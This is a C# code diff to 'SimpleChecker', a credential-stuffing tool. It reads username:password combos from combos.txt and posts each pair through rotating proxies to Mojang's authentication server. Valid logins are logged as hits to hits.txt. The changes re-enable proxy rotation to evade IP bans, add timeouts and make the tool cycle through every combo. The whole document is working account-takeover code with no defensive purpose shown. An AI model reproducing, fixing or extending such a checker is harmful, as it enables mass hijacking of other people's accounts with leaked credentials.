@@ -26,33 +26,43 @@ namespace SimpleChecker
             return proxyList[index];
         }
 
+        public string GrabLoginLine()
+        {
+            return combos[0];
+        }
+
+        public void GrabUserandPasswordHelper()
+        {
+            bool isEmpty = combos.Count == 0;
+            if(isEmpty)
+            {
+                Console.WriteLine("complete");
+            }
+            else
+            {
+                GrabUserandPassword();
+            }
+        }
         public void GrabUserandPassword()
         //extract a line from the combos.txt
         {
             {
-                foreach (string line in combos)
-                {
-                    string[] proxyandport = GrabProxie().Split(":");
-                    string proxy = proxyandport[0];
-                    string port = proxyandport[1];
-                    string[] usrpws = line.Split(":");
-                    string name = usrpws[0];
-                    string pwd = usrpws[1];
-                    Post(proxy, port, name, pwd);
-                }
+                string[] proxyandport = GrabProxie().Split(":");
+                string[] usrpws = GrabLoginLine().Split(":");
+                Post(proxyandport[0], proxyandport[1], usrpws[0], usrpws[1]);
             }
         }
         public void Post(string proxy, string port, string name, string pwd)
         {
             try
             {
-                //open connection
+                                //open connection
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://authserver.mojang.com/authenticate");
                 request.Method = "POST";
-                // request.Proxy = new WebProxy(proxy,int.Parse(port)); //connect through random proxy //!leadiung to timeout later on
-                request.Timeout = Timeout.Infinite; //set proxy alive time
-                request.KeepAlive =true;
-
+                request.Proxy = new WebProxy(proxy,int.Parse(port)); //connect through random proxy //!leadiung to timeout later on
+                request.Timeout = 5000; //set proxy alive time
+                request.ReadWriteTimeout = 5000;
+                request.Headers.Add("Content-Type", "application/json");
 
                 //set payload
                 // name = "mijaj50792@ualmail.com";
@@ -69,26 +79,30 @@ namespace SimpleChecker
                 requestStream.Close();
 
                 //read response
-                HttpWebResponse response = (HttpWebResponse)request.GetResponse(); //!operation times out //error
-                string result;
-                using (StreamReader rdr = new StreamReader(response.GetResponseStream()))
+                using (WebResponse response = request.GetResponse())
                 {
-                    result = rdr.ReadToEnd();
+                    // HttpWebResponse response = (HttpWebResponse)request.GetResponse(); //!operation times out //error
+                    string result;
+                    using (StreamReader rdr = new StreamReader(response.GetResponseStream()))
+                    {
+                        result = rdr.ReadToEnd();
+                    }
+                    Console.ForegroundColor  = ConsoleColor.Green;
+                    Console.WriteLine("[Hit!]\t\t"+ proxy+":"+port+"\t"+name+":"+pwd);
+                    using(StreamWriter file = File.AppendText("hits.txt"))
+                    {
+                        file.WriteLine(name+":"+pwd); // apend to hits.txtt
+                    }
+                    int removal = combos.IndexOf(name+":"+pwd);
+                    combos.RemoveAt(removal);
+                    GrabUserandPasswordHelper();
                 }
-                Console.ForegroundColor  = ConsoleColor.Green;
-                Console.WriteLine("[Hit!]\t\t"+ proxy+":"+port+"\t"+name+":"+pwd);
-                using(StreamWriter file = File.AppendText("hits.txt"))
-                {
-                    file.WriteLine(name+":"+pwd); // apend to hits.txtt
-                }
-
             }
             catch(WebException e)//if the remote server return an unauth response
             {
                 Console.ForegroundColor  = ConsoleColor.Red; // bad proxie (blanket banned)
                 if (e.ToString().Contains("timed out"))
                 {
-                    Console.ReadKey();
                     Console.WriteLine("---[Proxy Timeout(5s)]---");
                     Console.WriteLine("   "+proxy+":"+port);
                     int removal = proxyList.IndexOf(proxy+":"+port);
@@ -101,7 +115,11 @@ namespace SimpleChecker
                     combos.RemoveAt(removal);
                     Console.WriteLine("[Invalid!]\t" + proxy+":"+port+"\t"+name+":"+pwd);
                 }
-                GrabUserandPassword();
+                GrabUserandPasswordHelper();
+            }
+            catch(OperationCanceledException)
+            {
+                GrabUserandPasswordHelper();
             }
         }
     }
